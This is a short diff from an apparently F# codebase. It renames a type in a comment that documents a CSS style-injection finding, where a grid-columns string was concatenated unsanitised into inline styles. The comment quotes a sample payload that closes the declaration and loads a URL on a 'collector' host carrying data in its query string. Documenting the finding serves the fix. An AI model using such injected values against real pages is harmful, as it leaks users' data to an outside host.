@@ -180,7 +180,7 @@ let sanitizeExtraAttributes (attrs: Map<string, string>) : Map<string, string> =
 //  runs, and the NAME lives here so an emission site adopts it by replacing one
 //  call.
 //
-//  What the finding was. `LayoutMode.Grid.templateColumns` decodes as a free
+//  What the finding was. `BoxLayout.Grid.templateColumns` decodes as a free
 //  string, and four server renderers concatenated it into
 //  `style="grid-template-columns:…"` with no rule at all — so
 //  `"1fr;background:url(https://collector/?d=…)"` closed the declaration, opened
